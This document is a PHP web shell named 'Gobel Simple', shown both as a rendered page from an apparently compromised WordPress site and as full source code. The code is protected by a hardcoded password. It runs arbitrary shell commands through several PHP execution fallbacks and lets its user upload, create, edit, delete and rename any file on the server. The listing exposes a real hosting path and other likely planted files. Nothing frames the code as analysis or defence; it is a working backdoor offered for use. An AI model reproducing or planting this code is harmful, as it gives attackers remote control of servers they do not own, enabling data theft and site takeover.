<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Gobel Simple</title>
<style>
    body {
        background: #121212;
        color: #eee;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        margin: 0; padding: 20px;
    }
    h1, h2 { text-align: center; }
    form { margin-bottom: 15px; }
    input[type=text], textarea {
        width: 100%;
        padding: 8px;
        background: #1e1e1e;
        border: 1px solid #444;
        color: #eee;
        border-radius: 4px;
        box-sizing: border-box;
        font-family: monospace;
    }
    input[type=submit], button {
        background: #6200ee;
        color: white;
        border: none;
        padding: 8px 12px;
        border-radius: 4px;
        cursor: pointer;
        font-weight: bold;
        margin-top: 5px;
    }
    input[type=submit]:hover, button:hover {
        background: #3700b3;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 10px;
        color: #eee;
    }
    th, td {
        border: 1px solid #444;
        padding: 8px;
        text-align: left;
    }
    th {
        background: #333;
    }
    pre {
        background: #222;
        padding: 15px;
        border-radius: 6px;
        overflow-x: auto;
        max-height: 200px;
    }
    .msg {
        background: #333;
        padding: 10px;
        margin-bottom: 10px;
        border-radius: 5px;
        color: #ccc;
    }
    .hidden {
        display: none;
        background: #1e1e1e;
        border: 1px solid #444;
        padding: 10px;
        margin-bottom: 15px;
    }
</style>
<script>
function showRename(name) {
    let newname = prompt("Rename '" + name + "' to:");
    if (newname && newname.trim() !== '') {
        const form = document.createElement('form');
        form.method = 'POST';

        const oldInput = document.createElement('input');
        oldInput.type = 'hidden';
        oldInput.name = 'rename';
        oldInput.value = name;
        form.appendChild(oldInput);

        const newInput = document.createElement('input');
        newInput.type = 'hidden';
        newInput.name = 'newname';
        newInput.value = newname.trim();
        form.appendChild(newInput);

        document.body.appendChild(form);
        form.submit();
    }
}

function showEdit(filename) {
    const editor = document.getElementById('editor');
    const editFileName = document.getElementById('editfilename');
    const editFileContent = document.getElementById('editfilecontent');
    editFileName.value = filename;

    // Fetch file content via AJAX
    fetch('?action=getfile&file=' + encodeURIComponent(filename) + '&path=' + encodeURIComponent('/home/recruitmentfidso/public_html'))
    .then(resp => resp.text())
    .then(data => {
        editFileContent.value = data;
        editor.style.display = 'block';
    });
}

function hideEdit() {
    document.getElementById('editor').style.display = 'none';
}

</script>
</head>
<body>

<h1>Gobel Simple</h1>

<div class="msg"></div>

<!-- Command execution -->
<form method="post">
    <input type="text" name="cmd" placeholder="Enter shell command" autocomplete="off" autofocus />
    <input type="submit" value="Run Command" />
</form>

<!-- Upload form -->
<form method="post" enctype="multipart/form-data">
    <input type="file" name="upload" />
    <input type="submit" value="Upload File" />
</form>

<!-- New file form -->
<form method="post">
    <input type="hidden" name="newfile" value="1" />
    <input type="text" name="newfilename" placeholder="New file name" required />
    <textarea name="newcontent" rows="4" placeholder="Content of new file"></textarea>
    <input type="submit" value="Create File" />
</form>

<!-- New folder form -->
<form method="post">
    <input type="hidden" name="newfolder" value="1" />
    <input type="text" name="foldername" placeholder="New folder name" required />
    <input type="submit" value="Create Folder" />
</form>

<hr>
<h2>Listing: /home/recruitmentfidso/public_html</h2>
<table><tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso">[..] Parent Directory</a></td><td>Dir</td><td>-</td><td>-</td></tr><tr><td>.htaccess</td><td>File</td><td>281 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete .htaccess ?');"><input type="hidden" name="delete" value=".htaccess"><input type="submit" value="Delete"></form> <button onclick="showRename('.htaccess')">Rename</button> <button onclick="showEdit('.htaccess')">Edit</button></td></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso%2Fpublic_html%2F.well-known">.well-known</a></td><td>Dir</td><td>-</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete .well-known ?');"><input type="hidden" name="delete" value=".well-known"><input type="submit" value="Delete"></form> <button onclick="showRename('.well-known')">Rename</button> </td></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso%2Fpublic_html%2F.wp-cli">.wp-cli</a></td><td>Dir</td><td>-</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete .wp-cli ?');"><input type="hidden" name="delete" value=".wp-cli"><input type="submit" value="Delete"></form> <button onclick="showRename('.wp-cli')">Rename</button> </td></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso%2Fpublic_html%2FALFA_DATA">ALFA_DATA</a></td><td>Dir</td><td>-</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete ALFA_DATA ?');"><input type="hidden" name="delete" value="ALFA_DATA"><input type="submit" value="Delete"></form> <button onclick="showRename('ALFA_DATA')">Rename</button> </td></tr><tr><td>aa.txt</td><td>File</td><td>30303 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete aa.txt ?');"><input type="hidden" name="delete" value="aa.txt"><input type="submit" value="Delete"></form> <button onclick="showRename('aa.txt')">Rename</button> <button onclick="showEdit('aa.txt')">Edit</button></td></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso%2Fpublic_html%2Fcgi-bin">cgi-bin</a></td><td>Dir</td><td>-</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete cgi-bin ?');"><input type="hidden" name="delete" value="cgi-bin"><input type="submit" value="Delete"></form> <button onclick="showRename('cgi-bin')">Rename</button> </td></tr><tr><td>index.php</td><td>File</td><td>863 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete index.php ?');"><input type="hidden" name="delete" value="index.php"><input type="submit" value="Delete"></form> <button onclick="showRename('index.php')">Rename</button> <button onclick="showEdit('index.php')">Edit</button></td></tr><tr><td>init.php</td><td>File</td><td>463790 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete init.php ?');"><input type="hidden" name="delete" value="init.php"><input type="submit" value="Delete"></form> <button onclick="showRename('init.php')">Rename</button> <button onclick="showEdit('init.php')">Edit</button></td></tr><tr><td>license.txt</td><td>File</td><td>19903 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete license.txt ?');"><input type="hidden" name="delete" value="license.txt"><input type="submit" value="Delete"></form> <button onclick="showRename('license.txt')">Rename</button> <button onclick="showEdit('license.txt')">Edit</button></td></tr><tr><td>ms</td><td>File</td><td>78696 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete ms ?');"><input type="hidden" name="delete" value="ms"><input type="submit" value="Delete"></form> <button onclick="showRename('ms')">Rename</button> <button onclick="showEdit('ms')">Edit</button></td></tr><tr><td>oke.php</td><td>File</td><td>12588 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete oke.php ?');"><input type="hidden" name="delete" value="oke.php"><input type="submit" value="Delete"></form> <button onclick="showRename('oke.php')">Rename</button> <button onclick="showEdit('oke.php')">Edit</button></td></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso%2Fpublic_html%2Fqwc3xe">qwc3xe</a></td><td>Dir</td><td>-</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete qwc3xe ?');"><input type="hidden" name="delete" value="qwc3xe"><input type="submit" value="Delete"></form> <button onclick="showRename('qwc3xe')">Rename</button> </td></tr><tr><td>readme.html</td><td>File</td><td>7425 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete readme.html ?');"><input type="hidden" name="delete" value="readme.html"><input type="submit" value="Delete"></form> <button onclick="showRename('readme.html')">Rename</button> <button onclick="showEdit('readme.html')">Edit</button></td></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso%2Fpublic_html%2Fso">so</a></td><td>Dir</td><td>-</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete so ?');"><input type="hidden" name="delete" value="so"><input type="submit" value="Delete"></form> <button onclick="showRename('so')">Rename</button> </td></tr><tr><td>tes.txt</td><td>File</td><td>9 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete tes.txt ?');"><input type="hidden" name="delete" value="tes.txt"><input type="submit" value="Delete"></form> <button onclick="showRename('tes.txt')">Rename</button> <button onclick="showEdit('tes.txt')">Edit</button></td></tr><tr><td>weax.tx</td><td>File</td><td>5 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete weax.tx ?');"><input type="hidden" name="delete" value="weax.tx"><input type="submit" value="Delete"></form> <button onclick="showRename('weax.tx')">Rename</button> <button onclick="showEdit('weax.tx')">Edit</button></td></tr><tr><td>wp-activate.php</td><td>File</td><td>7387 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-activate.php ?');"><input type="hidden" name="delete" value="wp-activate.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-activate.php')">Rename</button> <button onclick="showEdit('wp-activate.php')">Edit</button></td></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso%2Fpublic_html%2Fwp-admin">wp-admin</a></td><td>Dir</td><td>-</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-admin ?');"><input type="hidden" name="delete" value="wp-admin"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-admin')">Rename</button> </td></tr><tr><td>wp-blog-header.php</td><td>File</td><td>372 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-blog-header.php ?');"><input type="hidden" name="delete" value="wp-blog-header.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-blog-header.php')">Rename</button> <button onclick="showEdit('wp-blog-header.php')">Edit</button></td></tr><tr><td>wp-class-info.php</td><td>File</td><td>422 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-class-info.php ?');"><input type="hidden" name="delete" value="wp-class-info.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-class-info.php')">Rename</button> <button onclick="showEdit('wp-class-info.php')">Edit</button></td></tr><tr><td>wp-comments-post.php</td><td>File</td><td>2323 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-comments-post.php ?');"><input type="hidden" name="delete" value="wp-comments-post.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-comments-post.php')">Rename</button> <button onclick="showEdit('wp-comments-post.php')">Edit</button></td></tr><tr><td>wp-config-sample.php</td><td>File</td><td>3336 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-config-sample.php ?');"><input type="hidden" name="delete" value="wp-config-sample.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-config-sample.php')">Rename</button> <button onclick="showEdit('wp-config-sample.php')">Edit</button></td></tr><tr><td>wp-config.php</td><td>File</td><td>3278 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-config.php ?');"><input type="hidden" name="delete" value="wp-config.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-config.php')">Rename</button> <button onclick="showEdit('wp-config.php')">Edit</button></td></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso%2Fpublic_html%2Fwp-content">wp-content</a></td><td>Dir</td><td>-</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-content ?');"><input type="hidden" name="delete" value="wp-content"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-content')">Rename</button> </td></tr><tr><td>wp-cron.php</td><td>File</td><td>5617 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-cron.php ?');"><input type="hidden" name="delete" value="wp-cron.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-cron.php')">Rename</button> <button onclick="showEdit('wp-cron.php')">Edit</button></td></tr><tr><td><a href="?path=%2Fhome%2Frecruitmentfidso%2Fpublic_html%2Fwp-includes">wp-includes</a></td><td>Dir</td><td>-</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-includes ?');"><input type="hidden" name="delete" value="wp-includes"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-includes')">Rename</button> </td></tr><tr><td>wp-links-opml.php</td><td>File</td><td>2502 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-links-opml.php ?');"><input type="hidden" name="delete" value="wp-links-opml.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-links-opml.php')">Rename</button> <button onclick="showEdit('wp-links-opml.php')">Edit</button></td></tr><tr><td>wp-load.php</td><td>File</td><td>3937 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-load.php ?');"><input type="hidden" name="delete" value="wp-load.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-load.php')">Rename</button> <button onclick="showEdit('wp-load.php')">Edit</button></td></tr><tr><td>wp-login.php</td><td>File</td><td>51414 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-login.php ?');"><input type="hidden" name="delete" value="wp-login.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-login.php')">Rename</button> <button onclick="showEdit('wp-login.php')">Edit</button></td></tr><tr><td>wp-mail.php</td><td>File</td><td>8727 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-mail.php ?');"><input type="hidden" name="delete" value="wp-mail.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-mail.php')">Rename</button> <button onclick="showEdit('wp-mail.php')">Edit</button></td></tr><tr><td>wp-settings.php</td><td>File</td><td>30081 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-settings.php ?');"><input type="hidden" name="delete" value="wp-settings.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-settings.php')">Rename</button> <button onclick="showEdit('wp-settings.php')">Edit</button></td></tr><tr><td>wp-signup.php</td><td>File</td><td>34516 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-signup.php ?');"><input type="hidden" name="delete" value="wp-signup.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-signup.php')">Rename</button> <button onclick="showEdit('wp-signup.php')">Edit</button></td></tr><tr><td>wp-trackback.php</td><td>File</td><td>5102 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete wp-trackback.php ?');"><input type="hidden" name="delete" value="wp-trackback.php"><input type="submit" value="Delete"></form> <button onclick="showRename('wp-trackback.php')">Rename</button> <button onclick="showEdit('wp-trackback.php')">Edit</button></td></tr><tr><td>xmlrpc.php</td><td>File</td><td>3205 bytes</td><td><form style="display:inline" method="post" onsubmit="return confirm('Delete xmlrpc.php ?');"><input type="hidden" name="delete" value="xmlrpc.php"><input type="submit" value="Delete"></form> <button onclick="showRename('xmlrpc.php')">Rename</button> <button onclick="showEdit('xmlrpc.php')">Edit</button></td></tr></table>
<!-- File editor popup -->
<div id="editor" class="hidden">
    <form method="post">
        <input type="hidden" name="editfile" id="editfilename" />
        <textarea id="editfilecontent" name="filecontent" rows="15" style="width:100%;"></textarea><br/>
        <input type="submit" value="Save File" />
        <button type="button" onclick="hideEdit()">Cancel</button>
    </form>
</div>

<?php
session_start();
error_reporting(0);

// Password proteksi (ubah password sesuai keinginanmu)
$password = "gobelteam2024!";
if (!isset($_SESSION['auth'])) {
    if ($_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        echo '<form method="post" style="margin-top:20%;text-align:center;"><input type="password" name="pass" placeholder="Enter Password" style="padding:10px;" /><br><br><button type="submit">Login</button></form>';
        exit;
    }
}
?>
<?php
error_reporting(0);
session_start();

// Set current directory, default "."
if (isset($_GET['path'])) {
    $currentPath = realpath($_GET['path']);
    if ($currentPath === false || !is_dir($currentPath)) {
        $currentPath = getcwd();
    }
} else {
    $currentPath = getcwd();
}

// Sanitize currentPath to prevent directory traversal out of root (optional)
// $root = '/var/www/html'; // contoh root, sesuaikan jika perlu
// if (strpos($currentPath, $root) !== 0) $currentPath = $root;

// Fungsi eksekusi command dengan fallback ke fungsi yang tersedia
function run_command($cmd) {
    if (!$cmd) return '';
    if (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output);
        return implode("\n", $output);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
        return $output;
    } elseif (function_exists('proc_open')) {
        $process = proc_open($cmd, [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ], $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            proc_close($process);
            return $output . $error;
        }
    }
    return "Command execution not available on this server.";
}

// Handle commands
$cmdOutput = '';
if (isset($_POST['cmd']) && !empty(trim($_POST['cmd']))) {
    $cmdOutput = run_command(trim($_POST['cmd']));
}

// Handle file upload
$uploadMsg = '';
if (isset($_FILES['upload']) && $_FILES['upload']['error'] == UPLOAD_ERR_OK) {
    $dest = $currentPath . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $uploadMsg = "File uploaded: " . htmlspecialchars(basename($_FILES['upload']['name']));
    } else {
        $uploadMsg = "Upload failed!";
    }
}

// Handle new file creation
$newFileMsg = '';
if (isset($_POST['newfile'])) {
    $newFileName = $currentPath . DIRECTORY_SEPARATOR . basename($_POST['newfilename']);
    $newContent = $_POST['newcontent'] ?? '';
    if (file_put_contents($newFileName, $newContent) !== false) {
        $newFileMsg = "File created: " . htmlspecialchars(basename($_POST['newfilename']));
    } else {
        $newFileMsg = "Failed to create file!";
    }
}

// Handle new folder creation
$newFolderMsg = '';
if (isset($_POST['newfolder'])) {
    $newFolderName = $currentPath . DIRECTORY_SEPARATOR . basename($_POST['foldername']);
    if (!file_exists($newFolderName) && mkdir($newFolderName)) {
        $newFolderMsg = "Folder created: " . htmlspecialchars(basename($_POST['foldername']));
    } else {
        $newFolderMsg = "Failed to create folder or already exists!";
    }
}

// Handle delete file/folder
$deleteMsg = '';
if (isset($_POST['delete'])) {
    $delPath = realpath($currentPath . DIRECTORY_SEPARATOR . $_POST['delete']);
    if ($delPath && strpos($delPath, $currentPath) === 0) {
        if (is_dir($delPath)) {
            $deleteMsg = rmdir($delPath) ? "Folder deleted." : "Failed to delete folder.";
        } else {
            $deleteMsg = unlink($delPath) ? "File deleted." : "Failed to delete file.";
        }
    } else {
        $deleteMsg = "Invalid path.";
    }
}

// Handle rename file/folder
$renameMsg = '';
if (isset($_POST['rename']) && isset($_POST['newname'])) {
    $oldPath = realpath($currentPath . DIRECTORY_SEPARATOR . $_POST['rename']);
    $newPath = $currentPath . DIRECTORY_SEPARATOR . basename($_POST['newname']);
    if ($oldPath && strpos($oldPath, $currentPath) === 0) {
        if (rename($oldPath, $newPath)) {
            $renameMsg = "Renamed successfully.";
        } else {
            $renameMsg = "Rename failed.";
        }
    } else {
        $renameMsg = "Invalid path.";
    }
}

// Handle edit file
$editMsg = '';
if (isset($_POST['editfile']) && isset($_POST['filecontent'])) {
    $editPath = realpath($currentPath . DIRECTORY_SEPARATOR . $_POST['editfile']);
    if ($editPath && strpos($editPath, $currentPath) === 0 && is_file($editPath) && is_writable($editPath)) {
        if (file_put_contents($editPath, $_POST['filecontent']) !== false) {
            $editMsg = "File saved.";
        } else {
            $editMsg = "Failed to save file.";
        }
    } else {
        $editMsg = "Invalid path or file not writable.";
    }
}

// List directory function with clickable folders
function list_dir($path) {
    $items = scandir($path);
    echo '<table>';
    echo '<tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>';
    foreach ($items as $item) {
        if ($item == '.') continue;
        if ($item == '..') {
            $parent = dirname($path);
            echo '<tr><td><a href="?path=' . urlencode($parent) . '">[..] Parent Directory</a></td><td>Dir</td><td>-</td><td>-</td></tr>';
            continue;
        }
        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($fullPath);
        $size = $isDir ? '-' : filesize($fullPath) . ' bytes';

        echo '<tr>';
        if ($isDir) {
            echo '<td><a href="?path=' . urlencode($fullPath) . '">' . htmlspecialchars($item) . '</a></td><td>Dir</td><td>' . $size . '</td>';
        } else {
            echo '<td>' . htmlspecialchars($item) . '</td><td>File</td><td>' . $size . '</td>';
        }

        // Actions: Delete, Rename, Edit (only files)
        echo '<td>';
        echo '<form style="display:inline" method="post" onsubmit="return confirm(\'Delete ' . htmlspecialchars($item) . ' ?\');">';
        echo '<input type="hidden" name="delete" value="' . htmlspecialchars($item) . '">';
        echo '<input type="submit" value="Delete">';
        echo '</form> ';

        echo '<button onclick="showRename(\'' . addslashes($item) . '\')">Rename</button> ';

        if (!$isDir) {
            echo '<button onclick="showEdit(\'' . addslashes($item) . '\')">Edit</button>';
        }
        echo '</td>';

        echo '</tr>';
    }
    echo '</table>';
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Gobel Simple</title>
<style>
    body {
        background: #121212;
        color: #eee;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        margin: 0; padding: 20px;
    }
    h1, h2 { text-align: center; }
    form { margin-bottom: 15px; }
    input[type=text], textarea {
        width: 100%;
        padding: 8px;
        background: #1e1e1e;
        border: 1px solid #444;
        color: #eee;
        border-radius: 4px;
        box-sizing: border-box;
        font-family: monospace;
    }
    input[type=submit], button {
        background: #6200ee;
        color: white;
        border: none;
        padding: 8px 12px;
        border-radius: 4px;
        cursor: pointer;
        font-weight: bold;
        margin-top: 5px;
    }
    input[type=submit]:hover, button:hover {
        background: #3700b3;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 10px;
        color: #eee;
    }
    th, td {
        border: 1px solid #444;
        padding: 8px;
        text-align: left;
    }
    th {
        background: #333;
    }
    pre {
        background: #222;
        padding: 15px;
        border-radius: 6px;
        overflow-x: auto;
        max-height: 200px;
    }
    .msg {
        background: #333;
        padding: 10px;
        margin-bottom: 10px;
        border-radius: 5px;
        color: #ccc;
    }
    .hidden {
        display: none;
        background: #1e1e1e;
        border: 1px solid #444;
        padding: 10px;
        margin-bottom: 15px;
    }
</style>
<script>
function showRename(name) {
    let newname = prompt("Rename '" + name + "' to:");
    if (newname && newname.trim() !== '') {
        const form = document.createElement('form');
        form.method = 'POST';

        const oldInput = document.createElement('input');
        oldInput.type = 'hidden';
        oldInput.name = 'rename';
        oldInput.value = name;
        form.appendChild(oldInput);

        const newInput = document.createElement('input');
        newInput.type = 'hidden';
        newInput.name = 'newname';
        newInput.value = newname.trim();
        form.appendChild(newInput);

        document.body.appendChild(form);
        form.submit();
    }
}

function showEdit(filename) {
    const editor = document.getElementById('editor');
    const editFileName = document.getElementById('editfilename');
    const editFileContent = document.getElementById('editfilecontent');
    editFileName.value = filename;

    // Fetch file content via AJAX
    fetch('?action=getfile&file=' + encodeURIComponent(filename) + '&path=' + encodeURIComponent('<?php echo addslashes($currentPath); ?>'))
    .then(resp => resp.text())
    .then(data => {
        editFileContent.value = data;
        editor.style.display = 'block';
    });
}

function hideEdit() {
    document.getElementById('editor').style.display = 'none';
}

</script>
</head>
<body>

<h1>Gobel Simple</h1>

<div class="msg"><?php
if ($cmdOutput) echo "<b>Command Output:</b><pre>" . htmlspecialchars($cmdOutput) . "</pre>";
if ($uploadMsg) echo "<b>Upload:</b> " . htmlspecialchars($uploadMsg) . "<br>";
if ($newFileMsg) echo "<b>New File:</b> " . htmlspecialchars($newFileMsg) . "<br>";
if ($newFolderMsg) echo "<b>New Folder:</b> " . htmlspecialchars($newFolderMsg) . "<br>";
if ($deleteMsg) echo "<b>Delete:</b> " . htmlspecialchars($deleteMsg) . "<br>";
if ($renameMsg) echo "<b>Rename:</b> " . htmlspecialchars($renameMsg) . "<br>";
if ($editMsg) echo "<b>Edit File:</b> " . htmlspecialchars($editMsg) . "<br>";
?></div>

<!-- Command execution -->
<form method="post">
    <input type="text" name="cmd" placeholder="Enter shell command" autocomplete="off" autofocus />
    <input type="submit" value="Run Command" />
</form>

<!-- Upload form -->
<form method="post" enctype="multipart/form-data">
    <input type="file" name="upload" />
    <input type="submit" value="Upload File" />
</form>

<!-- New file form -->
<form method="post">
    <input type="hidden" name="newfile" value="1" />
    <input type="text" name="newfilename" placeholder="New file name" required />
    <textarea name="newcontent" rows="4" placeholder="Content of new file"></textarea>
    <input type="submit" value="Create File" />
</form>

<!-- New folder form -->
<form method="post">
    <input type="hidden" name="newfolder" value="1" />
    <input type="text" name="foldername" placeholder="New folder name" required />
    <input type="submit" value="Create Folder" />
</form>

<hr>
<h2>Listing: <?php echo htmlspecialchars($currentPath); ?></h2>
<?php list_dir($currentPath); ?>

<!-- File editor popup -->
<div id="editor" class="hidden">
    <form method="post">
        <input type="hidden" name="editfile" id="editfilename" />
        <textarea id="editfilecontent" name="filecontent" rows="15" style="width:100%;"></textarea><br/>
        <input type="submit" value="Save File" />
        <button type="button" onclick="hideEdit()">Cancel</button>
    </form>
</div>

<?php
// Handle AJAX request to get file content for editing
if (isset($_GET['action']) && $_GET['action'] === 'getfile' && isset($_GET['file'])) {
    $file = realpath($currentPath . DIRECTORY_SEPARATOR . $_GET['file']);
    if ($file && strpos($file, $currentPath) === 0 && is_file($file)) {
        echo file_get_contents($file);
    } else {
        echo "Error: Cannot read file.";
    }
    exit;
}
?>

</body>
</html>
